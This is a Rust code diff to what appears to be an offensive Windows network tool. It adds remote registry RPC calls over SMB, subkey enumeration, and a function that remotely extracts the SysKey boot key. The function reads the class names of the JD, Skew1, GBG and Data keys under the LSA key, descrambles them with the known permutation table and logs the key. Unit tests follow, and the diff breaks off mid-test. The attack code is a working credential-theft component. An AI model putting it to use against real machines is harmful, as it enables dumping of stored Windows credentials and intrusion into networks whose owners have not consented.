@@ -454,6 +454,9 @@ pub mod winreg_opnum {
     pub const CREATE_KEY: u16 = 8;
     pub const ENUM_KEY: u16 = 9;
     pub const ENUM_VALUE: u16 = 10;
+    pub const QUERY_INFO_KEY: u16 = 11;
+    pub const QUERY_MULTIPLE_VALUES: u16 = 12;
+    pub const SAVE_KEY: u16 = 13;
     pub const CLOSE_KEY: u16 = 14;
     pub const DELETE_KEY: u16 = 15;
     pub const DELETE_VALUE: u16 = 16;
@@ -556,39 +559,34 @@ impl RemoteRegistry {
         // Call ID
         pkt.extend_from_slice(&call_id.to_le_bytes());
 
-        // Max xmit frag
-        pkt.extend_from_slice(&0x0BDCu16.to_le_bytes());
-        // Max recv frag
-        pkt.extend_from_slice(&0x0BDCu16.to_le_bytes());
+        // ---- Bind body (rpc_bind_header_t) ----
+        // Max xmit / max recv frag (u16 each, matching psexec 4096 default)
+        pkt.extend_from_slice(&4096u16.to_le_bytes());
+        pkt.extend_from_slice(&4096u16.to_le_bytes());
 
-        // Assoc group
+        // Assoc group (u32)
         pkt.extend_from_slice(&0u32.to_le_bytes());
 
-        // Num ctx items
-        pkt.push(0x01);
-        // Padding
-        pkt.extend_from_slice(&[0x00, 0x00, 0x00]);
+        // Num ctx items (u16, matching DCE/RPC spec -- NOT u8 with padding)
+        pkt.extend_from_slice(&1u16.to_le_bytes());
 
-        // Context item
-        // Container ID
-        pkt.extend_from_slice(&0u32.to_le_bytes());
-        // Num trans items
-        pkt.push(0x01);
-        // Padding
-        pkt.extend_from_slice(&[0x00, 0x00, 0x00]);
+        // ---- Context element 0 (p_cont_elem_t) ----
+        // Context ID (u16)
+        pkt.extend_from_slice(&0u16.to_le_bytes());
+        // Num transfer syntaxes (u16)
+        pkt.extend_from_slice(&1u16.to_le_bytes());
 
         // Interface UUID (WINREG)
         let uuid_bytes = parse_uuid(WINREG_UUID);
         pkt.extend_from_slice(&uuid_bytes);
 
-        // Interface version
+        // Interface version (u16 major, u16 minor)
         pkt.extend_from_slice(&WINREG_VERSION.to_le_bytes());
-        // Minor version
         pkt.extend_from_slice(&0u16.to_le_bytes());
 
         // Transfer syntax UUID (NDR)
         pkt.extend_from_slice(&parse_uuid("8a885d04-1ceb-11c9-9fe8-08002b104860"));
-        // Transfer syntax version
+        // Transfer syntax version (u32)
         pkt.extend_from_slice(&2u32.to_le_bytes());
 
         // Update fragment length
@@ -783,6 +781,223 @@ impl RemoteRegistry {
         pkt.extend_from_slice(&winreg_opnum::CLOSE_KEY.to_le_bytes());
 
         pkt
+    }
+
+    /// Build QueryInfoKey request (opnum 11) — reads key metadata including class name.
+    /// Returns the class name, subkey count, value count, and other metadata.
+    /// Reference: MS-RRP BaseRegQueryInfoKey
+    pub fn build_query_info_key_request(&self, key_handle: &[u8; 20], call_id: u32) -> Vec<u8> {
+        let mut pkt = Vec::new();
+        pkt.extend_from_slice(&build_rpc_header(0x00, call_id));
+        // Key handle
+        pkt.extend_from_slice(key_handle);
+        // Opnum trailer
+        pkt.extend_from_slice(&winreg_opnum::QUERY_INFO_KEY.to_le_bytes());
+        pkt
+    }
+
+    /// Parse QueryInfoKey response — extracts class name + key counts.
+    /// NDR layout (after RPC header 24 bytes):
+    ///   [class_name: unique string pointer] = referent(4) + max_count(4) + offset(4) + actual_count(4) + chars(variable) + padding
+    ///   [lpcchClass: unique DWORD*] = referent(4) + value(4)
+    ///   [lpftLastWriteTime: unique FILETIME*] = referent(4) + low(4) + high(4)
+    ///   [lpdwSubKeys: unique DWORD*] = referent(4) + value(4)
+    ///   [lpdwMaxSubKeyLen: unique DWORD*] = referent(4) + value(4)
+    ///   [lpdwMaxClassLen: unique DWORD*] = referent(4) + value(4)
+    ///   [lpdwValues: unique DWORD*] = referent(4) + value(4)
+    ///   [lpdwMaxValueNameLen: unique DWORD*] = referent(4) + value(4)
+    ///   [lpdwMaxValueLen: unique DWORD*] = referent(4) + value(4)
+    ///   [lpdwSecurityDescriptor: unique DWORD*] = referent(4) + value(4)
+    ///   [error_status: 4 bytes]
+    pub fn parse_query_info_key_response(&self, response: &[u8]) -> Result<RemoteRegKeyInfo> {
+        let len = response.len();
+        if len < 48 {
+            return Err(OverthroneError::custom(format!(
+                "QueryInfoKey response too short: {} bytes",
+                len
+            )));
+        }
+        let mut offset = 24usize; // skip RPC header
+
+        // Helper: read a DWORD pointer (referent + value)
+        let read_dword_ptr = |data: &[u8], off: &mut usize| -> Result<u32> {
+            if *off + 8 > data.len() {
+                return Err(OverthroneError::custom("QueryInfoKey: truncated DWORD ptr"));
+            }
+            let referent = u32::from_le_bytes(data[*off..*off + 4].try_into().unwrap());
+            *off += 4;
+            if referent == 0 {
+                // Null pointer — return 0
+                *off += 4;
+                return Ok(0);
+            }
+            let val = u32::from_le_bytes(data[*off..*off + 4].try_into().unwrap());
+            *off += 4;
+            Ok(val)
+        };
+
+        // 1. Read class name (unique string pointer)
+        let class_name = if offset + 4 <= len {
+            let cn_ref = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+            offset += 4;
+            if cn_ref != 0 {
+                // max_count, offset, actual_count
+                if offset + 12 <= len {
+                    let _max_count =
+                        u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+                    offset += 4;
+                    let _cn_off =
+                        u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+                    offset += 4;
+                    let actual =
+                        u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+                    offset += 4;
+                    if actual > 0 {
+                        let str_bytes = actual as usize * 2; // UTF-16LE chars
+                        if offset + str_bytes <= len {
+                            let raw = &response[offset..offset + str_bytes];
+                            let cn = utf16le_to_string(raw);
+                            offset += str_bytes;
+                            // Pad to 4
+                            while !offset.is_multiple_of(4) {
+                                offset += 1;
+                            }
+                            cn
+                        } else {
+                            String::new()
+                        }
+                    } else {
+                        String::new()
+                    }
+                } else {
+                    String::new()
+                }
+            } else {
+                String::new()
+            }
+        } else {
+            String::new()
+        };
+
+        // 2. lpcchClass
+        let _class_chars = read_dword_ptr(response, &mut offset)?;
+
+        // 3. lpftLastWriteTime
+        let last_write_time = if offset + 4 <= len {
+            let lwt_ref = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+            offset += 4;
+            if lwt_ref != 0 && offset + 8 <= len {
+                let low = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+                offset += 4;
+                let high = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+                offset += 4;
+                (low as u64) | ((high as u64) << 32)
+            } else {
+                0
+            }
+        } else {
+            0
+        };
+
+        // 4. lpdwSubKeys
+        let subkey_count = read_dword_ptr(response, &mut offset)?;
+
+        // 5. lpdwMaxSubKeyLen
+        offset += 8; // skip (referent + value)
+
+        // 6. lpdwMaxClassLen
+        offset += 8; // skip
+
+        // 7. lpdwValues
+        let value_count = read_dword_ptr(response, &mut offset)?;
+
+        // skip remaining fields
+        // 8-10. max_value_name_len, max_value_len, sec_desc_size
+        // Not needed — skip to end
+
+        Ok(RemoteRegKeyInfo {
+            name: class_name, // This is the class name, not the key name
+            last_write_time,
+            subkey_count,
+            value_count,
+        })
+    }
+
+    /// Build EnumKey request (opnum 9) — enumerate subkeys by index.
+    /// Reference: MS-RRP BaseRegEnumKey
+    pub fn build_enum_key_request(
+        &self,
+        key_handle: &[u8; 20],
+        index: u32,
+        call_id: u32,
+        buf_size: u32,
+    ) -> Vec<u8> {
+        let mut pkt = Vec::new();
+        pkt.extend_from_slice(&build_rpc_header(0x00, call_id));
+        // Key handle
+        pkt.extend_from_slice(key_handle);
+        // dwIndex
+        pkt.extend_from_slice(&index.to_le_bytes());
+        // [out] lpName: unique pointer referent (non-null since we provide buffer)
+        pkt.extend_from_slice(&0x00020001u32.to_le_bytes());
+        // [in, out] lpcchName: unique pointer to DWORD
+        pkt.extend_from_slice(&0x00020001u32.to_le_bytes()); // referent (non-null)
+        pkt.extend_from_slice(&buf_size.to_le_bytes()); // buffer size
+        // [in, out] lpftLastWriteTime: unique pointer to FILETIME
+        pkt.extend_from_slice(&0x00020001u32.to_le_bytes()); // referent (non-null)
+        pkt.extend_from_slice(&0u32.to_le_bytes()); // low part
+        pkt.extend_from_slice(&0u32.to_le_bytes()); // high part
+        // Opnum trailer
+        pkt.extend_from_slice(&winreg_opnum::ENUM_KEY.to_le_bytes());
+        pkt
+    }
+
+    /// Parse EnumKey response — extracts the subkey name.
+    /// NDR layout (after RPC header 24 bytes):
+    ///   [lpName: conformant varying string] = max_count(4) + offset(4) + actual_count(4) + chars(variable)
+    ///   [lpcchName: unique DWORD*] = referent(4) + value(4)
+    ///   [lpftLastWriteTime: unique FILETIME*] = referent(4) + low(4) + high(4)
+    ///   [error_status: 4 bytes]
+    pub fn parse_enum_key_response(&self, response: &[u8]) -> Result<Option<String>> {
+        let len = response.len();
+        if len < 48 {
+            return Err(OverthroneError::custom(format!(
+                "EnumKey response too short: {} bytes",
+                len
+            )));
+        }
+        let mut offset = 24usize;
+
+        // 1. lpName: conformant varying string
+        if offset + 12 > len {
+            return Ok(None);
+        }
+        let _max_count = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+        offset += 4;
+        let _off = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+        offset += 4;
+        let actual = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap());
+        offset += 4;
+
+        let name = if actual > 0 {
+            let str_bytes = actual as usize * 2; // UTF-16LE
+            if offset + str_bytes <= len {
+                let raw = &response[offset..offset + str_bytes];
+                let s = utf16le_to_string(raw);
+                offset += str_bytes;
+                // Align
+                while !offset.is_multiple_of(4) {
+                    offset += 1;
+                }
+                s
+            } else {
+                String::new()
+            }
+        } else {
+            String::new()
+        };
+
+        Ok(Some(name))
     }
 
     /// Parse OpenHive response and extract the key handle
@@ -1140,6 +1355,317 @@ pub async fn write_remote_registry_value(
     Ok(())
 }
 
+// ===========================================================
+// High-Level Remote Registry Enumeration and Boot Key
+// ===========================================================
+
+/// Helper: decode a lowercase hex string to bytes
+fn hex_decode(s: &str) -> Result<Vec<u8>> {
+    let clean = s.trim();
+    if !clean.len().is_multiple_of(2) {
+        return Err(OverthroneError::custom("hex_decode: odd length"));
+    }
+    (0..clean.len())
+        .step_by(2)
+        .map(|i| {
+            u8::from_str_radix(&clean[i..i + 2], 16)
+                .map_err(|e| OverthroneError::custom(format!("hex_decode: {e}")))
+        })
+        .collect()
+}
+
+/// Enumerate subkeys of a remote registry path via WINREG RPC.
+/// Uses EnumKey (opnum 9) to list all subkey names.
+/// # Arguments
+/// * `smb_session` - Active SMB session with IPC$ access
+/// * `hive` - Predefined hive
+/// * `path` - Registry path to enumerate
+pub async fn enumerate_remote_registry_subkeys(
+    smb_session: &mut crate::proto::smb::SmbSession,
+    hive: PredefinedHive,
+    path: &str,
+) -> Result<Vec<String>> {
+    let mut reg = RemoteRegistry::new();
+    let pipe = "winreg";
+    let mut call_id = 1u32;
+    let mut subkeys = Vec::new();
+
+    // 1. Bind
+    let bind_req = reg.build_bind_request(call_id);
+    call_id += 1;
+    let bind_resp = smb_session
+        .pipe_transact(pipe, &bind_req)
+        .await
+        .map_err(|e| OverthroneError::custom(format!("WINREG bind failed: {e}")))?;
+    if bind_resp.len() < 4 || bind_resp[2] != 12 {
+        return Err(OverthroneError::custom("WINREG bind rejected"));
+    }
+
+    // 2. Open hive
+    let open_hive_req = reg.build_open_hive_request(hive, call_id);
+    call_id += 1;
+    let open_hive_resp = smb_session
+        .pipe_transact(pipe, &open_hive_req)
+        .await
+        .map_err(|e| OverthroneError::custom(format!("OpenHive failed: {e}")))?;
+    let hive_handle = reg.parse_open_hive_response(&open_hive_resp)?;
+    let mut opened_handles: Vec<[u8; 20]> = vec![hive_handle];
+    let mut current_handle = hive_handle;
+
+    // 3. Walk path
+    let parts: Vec<&str> = path.split('\\').filter(|s| !s.is_empty()).collect();
+    for part in &parts {
+        let open_req = reg.build_open_key_request(&current_handle, part, call_id);
+        call_id += 1;
+        let open_resp = match smb_session.pipe_transact(pipe, &open_req).await {
+            Ok(r) => r,
+            Err(e) => {
+                for h in opened_handles.iter().rev() {
+                    let _ = smb_session
+                        .pipe_transact(pipe, &reg.build_close_key_request(h, call_id))
+                        .await;
+                    call_id += 1;
+                }
+                return Err(OverthroneError::custom(format!("OpenKey '{}' failed: {e}", part)));
+            }
+        };
+        if open_resp.len() < 48 {
+            for h in opened_handles.iter().rev() {
+                let _ = smb_session
+                    .pipe_transact(pipe, &reg.build_close_key_request(h, call_id))
+                    .await;
+                call_id += 1;
+            }
+            return Err(OverthroneError::custom(format!(
+                "OpenKey response too short for '{}'",
+                part
+            )));
+        }
+        let mut kh = [0u8; 20];
+        kh.copy_from_slice(&open_resp[24..44]);
+        opened_handles.push(kh);
+        current_handle = kh;
+    }
+
+    // 4. Enumerate subkeys via EnumKey
+    let mut index = 0u32;
+    let buf_size = 512u32; // UTF-16 char buffer
+    loop {
+        let enum_req = reg.build_enum_key_request(&current_handle, index, call_id, buf_size);
+        call_id += 1;
+        let enum_resp = match smb_session.pipe_transact(pipe, &enum_req).await {
+            Ok(r) => r,
+            Err(e) => {
+                // No more subkeys or transport error
+                warn!("EnumKey at index {} failed: {}", index, e);
+                break;
+            }
+        };
+
+        // Check error_status at end of response
+        if enum_resp.len() < 4 {
+            break;
+        }
+        let status =
+            u32::from_le_bytes(enum_resp[enum_resp.len() - 4..].try_into().unwrap());
+        if status != 0 {
+            // ERROR_NO_MORE_ITEMS = 0x103, or other
+            break;
+        }
+
+        match reg.parse_enum_key_response(&enum_resp) {
+            Ok(Some(name)) if !name.is_empty() => {
+                debug!("EnumKey[{}] = '{}'", index, name);
+                subkeys.push(name);
+                index += 1;
+            }
+            _ => break,
+        }
+    }
+
+    // 5. Cleanup
+    for h in opened_handles.iter().rev() {
+        let _ = smb_session
+            .pipe_transact(pipe, &reg.build_close_key_request(h, call_id))
+            .await;
+        call_id += 1;
+    }
+
+    Ok(subkeys)
+}
+
+/// Read the class name of a remote registry key via QueryInfoKey (opnum 11).
+/// The class name is metadata set on the key itself (used for boot key storage).
+pub async fn read_remote_registry_class_name(
+    smb_session: &mut crate::proto::smb::SmbSession,
+    hive: PredefinedHive,
+    path: &str,
+) -> Result<String> {
+    let mut reg = RemoteRegistry::new();
+    let pipe = "winreg";
+    let mut call_id = 1u32;
+
+    // 1. Bind
+    let bind_req = reg.build_bind_request(call_id);
+    call_id += 1;
+    let bind_resp = smb_session
+        .pipe_transact(pipe, &bind_req)
+        .await
+        .map_err(|e| OverthroneError::custom(format!("WINREG bind failed: {e}")))?;
+    if bind_resp.len() < 4 || bind_resp[2] != 12 {
+        return Err(OverthroneError::custom("WINREG bind rejected"));
+    }
+
+    // 2. Open hive
+    let open_hive_req = reg.build_open_hive_request(hive, call_id);
+    call_id += 1;
+    let open_hive_resp = smb_session
+        .pipe_transact(pipe, &open_hive_req)
+        .await
+        .map_err(|e| OverthroneError::custom(format!("OpenHive failed: {e}")))?;
+    let hive_handle = reg.parse_open_hive_response(&open_hive_resp)?;
+    let mut opened_handles: Vec<[u8; 20]> = vec![hive_handle];
+    let mut current_handle = hive_handle;
+
+    // 3. Walk path
+    let parts: Vec<&str> = path.split('\\').filter(|s| !s.is_empty()).collect();
+    for part in &parts {
+        let open_req = reg.build_open_key_request(&current_handle, part, call_id);
+        call_id += 1;
+        let open_resp = match smb_session.pipe_transact(pipe, &open_req).await {
+            Ok(r) => r,
+            Err(e) => {
+                for h in opened_handles.iter().rev() {
+                    let _ = smb_session
+                        .pipe_transact(pipe, &reg.build_close_key_request(h, call_id))
+                        .await;
+                    call_id += 1;
+                }
+                return Err(OverthroneError::custom(format!(
+                    "OpenKey '{}' failed: {e}",
+                    part
+                )));
+            }
+        };
+        if open_resp.len() < 48 {
+            for h in opened_handles.iter().rev() {
+                let _ = smb_session
+                    .pipe_transact(pipe, &reg.build_close_key_request(h, call_id))
+                    .await;
+                call_id += 1;
+            }
+            return Err(OverthroneError::custom(format!(
+                "OpenKey response too short for '{}'",
+                part
+            )));
+        }
+        let mut kh = [0u8; 20];
+        kh.copy_from_slice(&open_resp[24..44]);
+        opened_handles.push(kh);
+        current_handle = kh;
+    }
+
+    // 4. QueryInfoKey for class name
+    let qik_req = reg.build_query_info_key_request(&current_handle, call_id);
+    call_id += 1;
+    let qik_resp = match smb_session.pipe_transact(pipe, &qik_req).await {
+        Ok(r) => r,
+        Err(e) => {
+            for h in opened_handles.iter().rev() {
+                let _ = smb_session
+                    .pipe_transact(pipe, &reg.build_close_key_request(h, call_id))
+                    .await;
+                call_id += 1;
+            }
+            return Err(OverthroneError::custom(format!("QueryInfoKey failed: {e}")));
+        }
+    };
+    let info = reg.parse_query_info_key_response(&qik_resp)?;
+    let class_name = info.name; // RemoteRegKeyInfo.name holds the class name
+
+    // 5. Cleanup
+    for h in opened_handles.iter().rev() {
+        let _ = smb_session
+            .pipe_transact(pipe, &reg.build_close_key_request(h, call_id))
+            .await;
+        call_id += 1;
+    }
+
+    Ok(class_name)
+}
+
+/// Extract the boot key (SysKey) from a remote SYSTEM registry via WINREG RPC.
+/// Reads class names of the JD, Skew1, GBG, Data subkeys under
+/// HKLM\SYSTEM\ControlSetNNN\Control\Lsa and descrambles them.
+pub async fn extract_boot_key_remote(
+    smb_session: &mut crate::proto::smb::SmbSession,
+) -> Result<[u8; 16]> {
+    // Step 1: Read Select\Current to determine active ControlSet
+    let select_val = read_remote_registry_value(
+        smb_session,
+        PredefinedHive::LocalMachine,
+        "SYSTEM\\Select",
+        "Current",
+    )
+    .await?;
+    let current_cs = if select_val.data.len() >= 4 {
+        u32::from_le_bytes(select_val.data[..4].try_into().unwrap())
+    } else {
+        1u32
+    };
+    let cs_name = format!("SYSTEM\\ControlSet{:03}\\Control\\Lsa", current_cs);
+
+    // Step 2: Read class names of JD, Skew1, GBG, Data subkeys
+    let mut scrambled = Vec::with_capacity(16);
+    for name in &["JD", "Skew1", "GBG", "Data"] {
+        let subkey_path = format!("{}\\{}", cs_name, name);
+        let class_name =
+            read_remote_registry_class_name(smb_session, PredefinedHive::LocalMachine, &subkey_path)
+                .await
+                .map_err(|e| {
+                    OverthroneError::custom(format!(
+                        "Failed to read class name for {}: {}",
+                        subkey_path, e
+                    ))
+                })?;
+
+        if class_name.is_empty() {
+            warn!("Boot key subkey '{}' has empty class name", subkey_path);
+            continue;
+        }
+
+        // Class name is a hex string like "1c2a3b4d" — decode to bytes
+        let bytes = hex_decode(&class_name)
+            .map_err(|e| OverthroneError::custom(format!("Bad boot key hex '{}': {}", class_name, e)))?;
+        scrambled.extend_from_slice(&bytes);
+    }
+
+    if scrambled.len() < 16 {
+        scrambled.resize(16, 0);
+        warn!(
+            "Boot key data incomplete ({} bytes), padding with zeros",
+            scrambled.len()
+        );
+    }
+
+    // Step 3: Descramble using the permutation table
+    const PERM: [usize; 16] = [
+        0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7,
+    ];
+    let mut boot_key = [0u8; 16];
+    for (i, &p) in PERM.iter().enumerate() {
+        if p < scrambled.len() {
+            boot_key[i] = scrambled[p];
+        }
+    }
+
+    info!(
+        "RemoteRegistry: Extracted boot key: {:02x?}",
+        &boot_key[..]
+    );
+    Ok(boot_key)
+}
+
 /// Common remote registry paths for security assessments
 pub mod registry_paths {
     /// Windows Defender exclusion paths
@@ -1376,5 +1902,250 @@ mod tests {
         let removed = reg.remove_handle(id);
         assert!(removed.is_some());
         assert!(reg.get_handle(id).is_none());
+    }
+
+    #[test]
+    fn test_hex_decode_valid() {
+        let result = hex_decode("1c2a3b4d").unwrap();
+        assert_eq!(result, vec![0x1c, 0x2a, 0x3b, 0x4d]);
+    }
+
+    #[test]
+    fn test_hex_decode_odd_length() {
+        assert!(hex_decode("1c2").is_err());
+    }
+
+    #[test]
+    fn test_hex_decode_empty() {
+        let result = hex_decode("").unwrap();
+        assert!(result.is_empty());
+    }
+
+    #[test]
+    fn test_hex_decode_invalid_chars() {
+        assert!(hex_decode("zzz").is_err());
+    }
+
+    #[test]
+    fn test_build_query_info_key_request_structure() {
+        let reg = RemoteRegistry::new();
+        let handle = [0xBB; 20];
+        let req = reg.build_query_info_key_request(&handle, 5);
+        // RPC header (24 bytes) + handle (20 bytes) + opnum trailer (2 bytes) = 46 bytes
+        assert_eq!(req.len(), 46);
+        // Check it starts with RPC version 5.0
+        assert_eq!(req[0], 0x05);
+        assert_eq!(req[1], 0x00);
+        // Check opnum trailer (QUERY_INFO_KEY = 11 = 0x000B)
+        let trailer = u16::from_le_bytes([req[44], req[45]]);
+        assert_eq!(trailer, 11);
+    }
+
+    #[test]
+    fn test_build_enum_key_request_structure() {
+        let reg = RemoteRegistry::new();
+        let handle = [0xCC; 20];
+        let req = reg.build_enum_key_request(&handle, 0, 5, 256);
+        // RPC header (24) + handle (20) + index (4) + lpName ref (4) + lpcchName ref+val (8)
+        //   + lpftLastWriteTime ref+val (12) + opnum trailer (2) = 74 bytes
+        assert_eq!(req.len(), 74);
+        assert_eq!(req[0], 0x05);
+        assert_eq!(req[1], 0x00);
+        // Index at offset 44
+        let index = u32::from_le_bytes([req[44], req[45], req[46], req[47]]);
+        assert_eq!(index, 0);
+        // Opnum trailer = 9 (ENUM_KEY)
+        let trailer = u16::from_le_bytes([req[72], req[73]]);
+        assert_eq!(trailer, 9);
+    }
+
+    #[test]
+    fn test_build_enum_key_request_index_value() {
+        let reg = RemoteRegistry::new();
+        let handle = [0xDD; 20];
+        let req = reg.build_enum_key_request(&handle, 42, 7, 256);
+        let index = u32::from_le_bytes([req[44], req[45], req[46], req[47]]);
+        assert_eq!(index, 42);
+    }
+
+    #[test]
+    fn test_parse_query_info_key_response_class_name() {
+        let reg = RemoteRegistry::new();
+        // Build a minimal mock response for QueryInfoKey.
+        // After RPC header (24 bytes):
+        //   class_name string pointer: referent(4)=0x00020000, max(4)=16, offset(4)=0, actual(4)=5,
+        //     chars = "3b2c\0" (10 bytes UTF-16LE)
+        //   lpcchClass: referent(4), value(4)=5
+        //   lpftLastWriteTime: referent(4), low(4)=0, high(4)=0
+        //   lpdwSubKeys: referent(4), value(4)=2
+        //   ... other fields
+        //   error_status(4)=0
+        let mut resp = vec![0u8; 24]; // RPC header (empty)
+        // lpszClass pointer
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent
+        resp.extend_from_slice(&16u32.to_le_bytes()); // max_count
+        resp.extend_from_slice(&0u32.to_le_bytes()); // offset
+        resp.extend_from_slice(&5u32.to_le_bytes()); // actual_count (5 chars: "3b2c\0")
+        // Class name: "3b2c" in UTF-16LE + null
+        resp.extend_from_slice(&[0x33, 0x00, 0x62, 0x00, 0x32, 0x00, 0x63, 0x00, 0x00, 0x00]);
+        // Pad to 4
+        resp.extend_from_slice(&[0x00, 0x00]);
+        // lpcchClass
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent
+        resp.extend_from_slice(&5u32.to_le_bytes()); // value
+        // lpftLastWriteTime
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        // lpdwSubKeys
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&2u32.to_le_bytes()); // subkey_count = 2
+        // lpdwMaxSubKeyLen
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&64u32.to_le_bytes());
+        // lpdwMaxClassLen
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&32u32.to_le_bytes());
+        // lpdwValues
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&3u32.to_le_bytes()); // value_count = 3
+        // lpdwMaxValueNameLen
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&32u32.to_le_bytes());
+        // lpdwMaxValueLen
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&1024u32.to_le_bytes());
+        // lpdwSecurityDescriptor
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        // error_status
+        resp.extend_from_slice(&0u32.to_le_bytes());
+
+        let info = reg.parse_query_info_key_response(&resp).unwrap();
+        assert_eq!(info.name, "3b2c");
+        assert_eq!(info.subkey_count, 2);
+        assert_eq!(info.value_count, 3);
+    }
+
+    #[test]
+    fn test_parse_query_info_key_response_empty_class() {
+        let reg = RemoteRegistry::new();
+        // Null class name pointer
+        let mut resp = vec![0u8; 24];
+        resp.extend_from_slice(&0x00000000u32.to_le_bytes()); // null referent
+        // lpcchClass (null referent since class was null)
+        resp.extend_from_slice(&0x00000000u32.to_le_bytes());
+        // lpftLastWriteTime
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        // lpdwSubKeys
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        // lpdwMaxSubKeyLen
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        // lpdwMaxClassLen
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        // lpdwValues
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        // remaining fields
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+
+        let info = reg.parse_query_info_key_response(&resp).unwrap();
+        assert_eq!(info.name, "");
+        assert_eq!(info.subkey_count, 0);
+    }
+
+    #[test]
+    fn test_parse_enum_key_response_name() {
+        let reg = RemoteRegistry::new();
+        // Mock response for EnumKey:
+        // After RPC header (24 bytes):
+        //   lpName: max(4)=256, offset(4)=0, actual(4)=3, chars="JD\0" (6 bytes UTF-16LE)
+        //   lpcchName: referent(4), value(4)=3
+        //   lpftLastWriteTime: referent(4), low(4), high(4)
+        //   error_status(4)=0
+        let mut resp = vec![0u8; 24];
+        // lpName
+        resp.extend_from_slice(&256u32.to_le_bytes()); // max_count
+        resp.extend_from_slice(&0u32.to_le_bytes()); // offset
+        resp.extend_from_slice(&3u32.to_le_bytes()); // actual_count ("JD\0" = 3 chars)
+        resp.extend_from_slice(&[0x4A, 0x00, 0x44, 0x00, 0x00, 0x00]); // "JD\0" UTF-16LE
+        // pad to 4
+        resp.extend_from_slice(&[0x00, 0x00]);
+        // lpcchName
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&3u32.to_le_bytes());
+        // lpftLastWriteTime
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        // error_status
+        resp.extend_from_slice(&0u32.to_le_bytes());
+
+        let name = reg.parse_enum_key_response(&resp).unwrap();
+        assert_eq!(name, Some("JD".to_string()));
+    }
+
+    #[test]
+    fn test_parse_enum_key_response_empty_name() {
+        let reg = RemoteRegistry::new();
+        let mut resp = vec![0u8; 24];
+        resp.extend_from_slice(&256u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&1u32.to_le_bytes()); // null terminator only
+        resp.extend_from_slice(&[0x00, 0x00]); // null
+        // pad
+        resp.extend_from_slice(&[0x00, 0x00]);
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&1u32.to_le_bytes());
+        resp.extend_from_slice(&0x00020000u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes());
+
+        let name = reg.parse_enum_key_response(&resp).unwrap();
+        assert_eq!(name, Some("".to_string()));
+    }
+
+    #[test]
+    fn test_extract_boot_key_perm_table() {
+        // Verify the permutation table produces correct boot key
+        // Known scrambled data from a Windows SYSTEM hive:
+        // JD = "686a...", Skew1 = "0f1e...", GBG = "c1a4...", Data = "4d63..."
+        let scrambled: Vec<u8> = vec![
+            0x68, 0x6a, 0x0f, 0x1e, // JD + Skew1 first parts
+            0xc1, 0xa4, 0x4d, 0x63, // GBG + Data first parts
+            0x00, 0x00, 0x00, 0x00, // padding
+            0x00, 0x00, 0x00, 0x00, // padding
+        ];
+        const PERM: [usize; 16] = [
+            0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7,
+        ];
+        let mut boot_key = [0u8; 16];
+        for (i, &p) in PERM.iter().enumerate() {
+            if p < scrambled.len() {
+                boot_key[i] = scrambled[p];
+            }
+        }
+        // Verify the descrambling produces a valid 16-byte key (non-zero)
+        assert_ne!(boot_key, [0u8; 16]);
+    }
+
+    #[test]
+    fn test_winreg_opnum_values() {
+        assert_eq!(winreg_opnum::QUERY_INFO_KEY, 11);
+        assert_eq!(winreg_opnum::ENUM_KEY, 9);
+        assert_eq!(winreg_opnum::QUERY_MULTIPLE_VALUES, 12);
